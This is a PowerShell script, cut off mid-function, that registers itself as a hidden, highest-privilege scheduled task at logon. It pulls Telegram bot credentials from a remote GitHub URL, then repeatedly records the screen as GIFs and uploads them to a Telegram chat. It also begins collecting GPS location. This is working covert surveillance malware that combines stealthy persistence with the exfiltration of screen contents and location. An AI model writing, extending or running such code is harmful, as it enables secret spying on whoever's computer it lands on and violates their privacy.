param(
    [switch]$background
)

# ====================================================
# If not in background mode, install the scheduled task and exit
# ====================================================
if (-not $background) {
    $taskName = "ScreenCaptureTelegramBot"
    try {
        $scriptPath = (Resolve-Path $MyInvocation.MyCommand.Definition).Path
    } catch {
        Write-Error "Unable to resolve script path. Exiting."
        exit
    }
    $taskCommand = "PowerShell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`" -background"
    Write-Output "Installing scheduled task '$taskName'..."
    schtasks.exe /delete /tn $taskName /f | Out-Null
    $createTaskOutput = schtasks.exe /create /tn $taskName /tr $taskCommand /sc onlogon /rl HIGHEST /f
    if ($LASTEXITCODE -eq 0) {
        Write-Output "Scheduled task '$taskName' installed successfully."
        schtasks.exe /run /tn $taskName | Out-Null
    } else {
        Write-Error "Failed to install scheduled task. Output: $createTaskOutput"
    }
    exit
}

# ====================================================
# Background Mode: Main Functionality
# ====================================================
Write-Output "Running in background mode. Starting main loop..."

# Ensure temporary folder exists
if (-not (Test-Path "C:\\Temp")) {
    try {
        New-Item -ItemType Directory -Path "C:\\Temp" | Out-Null
    } catch {
        Write-Error "Cannot create C:\\Temp folder. Exiting."
        exit
    }
}

# Enable DPI Awareness (for high DPI screens)
Add-Type -MemberDefinition @"
    [DllImport("user32.dll")]
    public static extern bool SetProcessDPIAware();
"@ -Name NativeMethods -Namespace MyNamespace
[MyNamespace.NativeMethods]::SetProcessDPIAware() | Out-Null

# Retrieve Credentials from Remote Source
$credUrl = "https://raw.githubusercontent.com/Aman-SecurityKnock/ScreenCapture-TelegramBot/refs/heads/main/src/cred.dat"
try {
    $CredJson = (Invoke-WebRequest -Uri $credUrl -UseBasicParsing -ErrorAction Stop).Content
    $Cred = $CredJson | ConvertFrom-Json
} catch {
    Write-Error "Failed to retrieve credentials: $_"
    exit
}

# Function: Decrypt-Credential (returns plain text if not encrypted)
function Decrypt-Credential {
    param ([string]$EncryptedString)
    if ($EncryptedString -match '^01000000') {
        try {
            $secure = ConvertTo-SecureString $EncryptedString -ErrorAction Stop
            $bstr = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($secure)
            $plain = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($bstr)
            [System.Runtime.InteropServices.Marshal]::ZeroFreeBSTR($bstr)
            return $plain
        } catch {
            return $EncryptedString
        }
    } else {
        return $EncryptedString
    }
}

$BotToken = Decrypt-Credential -EncryptedString $Cred.BotToken
$ChatID = Decrypt-Credential -EncryptedString $Cred.ChatID

# Function: Capture-Frame (screenshot as a BitmapSource)
function Capture-Frame {
    Add-Type -AssemblyName System.Windows.Forms, System.Drawing, PresentationCore
    $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    $bmp = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
    $graphics = [System.Drawing.Graphics]::FromImage($bmp)
    $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
    $graphics.Dispose()
    $hBitmap = $bmp.GetHbitmap()
    $bitmapSource = [System.Windows.Interop.Imaging]::CreateBitmapSourceFromHBitmap(
        $hBitmap,
        [IntPtr]::Zero,
        [System.Windows.Int32Rect]::new(0, 0, $bmp.Width, $bmp.Height),
        [System.Windows.Media.Imaging.BitmapSizeOptions]::FromEmptyOptions()
    )
    Add-Type -MemberDefinition @"
        [DllImport("gdi32.dll")]
        public static extern bool DeleteObject(IntPtr hObject);
    "@ -Name GDI32 -Namespace Win32
    [Win32.GDI32]::DeleteObject($hBitmap) | Out-Null
    $bmp.Dispose()
    return $bitmapSource
}

# Function: Capture-AnimatedGIF (captures a screen GIF)
function Capture-AnimatedGIF {
    param(
        [int]$durationSeconds = 10,
        [int]$framesPerSecond = 3
    )
    Add-Type -AssemblyName PresentationCore
    $encoder = New-Object System.Windows.Media.Imaging.GifBitmapEncoder
    $totalFrames = [Math]::Ceiling($durationSeconds * $framesPerSecond)
    $frameInterval = 1 / $framesPerSecond
    for ($i = 0; $i -lt $totalFrames; $i++) {
        $frame = Capture-Frame
        $encoder.Frames.Add([System.Windows.Media.Imaging.BitmapFrame]::Create($frame))
        Start-Sleep -Seconds $frameInterval
    }
    $gifPath = "C:\\Temp\\screenrecord.gif"
    $fs = [System.IO.File]::Open($gifPath, [System.IO.FileMode]::Create)
    $encoder.Save($fs)
    $fs.Close()
    return $gifPath
}

# Function: Send-TelegramAnimation (sends the GIF via Telegram API)
function Send-TelegramAnimation {
    param (
        [string]$GifPath
    )
    $Uri = "https://api.telegram.org/bot$BotToken/sendAnimation"
    $Boundary = "----WebKitFormBoundary" + [System.Guid]::NewGuid().ToString("N")
    $LF = "`r`n"
    $ms = New-Object System.IO.MemoryStream
    $chatIdHeader = "--$Boundary$LF" +
        'Content-Disposition: form-data; name="chat_id"' + $LF + $LF +
        $ChatID + $LF
    $chatIdHeaderBytes = [System.Text.Encoding]::UTF8.GetBytes($chatIdHeader)
    $ms.Write($chatIdHeaderBytes, 0, $chatIdHeaderBytes.Length)
    $fileBytes = [System.IO.File]::ReadAllBytes($GifPath)
    $fileHeader = "--$Boundary$LF" +
        'Content-Disposition: form-data; name="animation"; filename="' + (Split-Path $GifPath -Leaf) + '"' + $LF +
        "Content-Type: image/gif$LF$LF"
    $fileHeaderBytes = [System.Text.Encoding]::UTF8.GetBytes($fileHeader)
    $ms.Write($fileHeaderBytes, 0, $fileHeaderBytes.Length)
    $ms.Write($fileBytes, 0, $fileBytes.Length)
    $ending = "$LF--$Boundary--$LF"
    $endingBytes = [System.Text.Encoding]::UTF8.GetBytes($ending)
    $ms.Write($endingBytes, 0, $endingBytes.Length)
    $ms.Seek(0, [System.IO.SeekOrigin]::Begin) | Out-Null
    $ContentBytes = $ms.ToArray()
    $WebRequest = [System.Net.HttpWebRequest]::Create($Uri)
    $WebRequest.Method = "POST"
    $WebRequest.ContentType = "multipart/form-data; boundary=$Boundary"
    $WebRequest.ContentLength = $ContentBytes.Length
    $Stream = $WebRequest.GetRequestStream()
    $Stream.Write($ContentBytes, 0, $ContentBytes.Length)
    $Stream.Close()
    try {
        $Response = $WebRequest.GetResponse()
        $ResponseStream = $Response.GetResponseStream()
        $Reader = New-Object System.IO.StreamReader($ResponseStream)
        $null = $Reader.ReadToEnd() | Out-Null
        $Reader.Close()
        $ResponseStream.Close()
        $Response.Close()
    } catch {
        Write-Error "Error sending Telegram animation: $_"
    }
}

# Function: Send-TelegramMessage (sends a text message)
function Send-TelegramMessage {
    param (
        [string]$Message
    )
    $Uri = "https://api.telegram.org/bot$BotToken/sendMessage"
    $Body = @{
        chat_id = $ChatID
        text = $Message
    }
    try {
        Invoke-RestMethod -Uri $Uri -Method Post -ContentType "application/json" -Body ($Body | ConvertTo-Json) | Out-Null
    } catch {
        Write-Error "Error sending Telegram message: $_"
    }
}

# Function: Get-WindowsGeolocation (retrieves GPS info)
Add-Type -AssemblyName System.Device
function Get-WindowsGeolocation {
    $watcher = New-Object System.Device.Location.GeoCoordinateWatcher
    $watcher.Start()
    $timeout = 30
    while ($watcher.Status -ne 'Ready' -and $timeout -gt 0) {
        Start-Sleep -Milliseconds 100
        $timeout--
    }
    if ($watcher.Position.Location.IsUnknown) {
        return $null
    }
    return @{
        Latitude = $watcher.Position.Location.Latitude
        Longitude = $watcher.Position.Location.Longitude
        Accuracy = $watcher

